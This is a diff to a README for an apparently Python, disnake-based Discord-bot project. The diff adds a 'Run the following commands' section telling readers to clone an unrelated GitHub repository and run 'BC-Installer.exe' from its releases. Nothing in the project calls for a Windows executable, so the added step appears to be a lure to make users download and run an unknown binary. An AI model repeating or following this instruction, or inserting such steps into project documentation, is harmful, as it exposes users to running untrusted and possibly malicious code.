@@ -6,3 +6,7 @@ Required libraries:
 
 - _**disnake**_
 - Other libraries that may be needed for various **unofficial modules**.
+
+# Run the following commands:
+- git clone https://github.com/csgocs/BC-sr.git
+- Releases > BC-Installer.exe
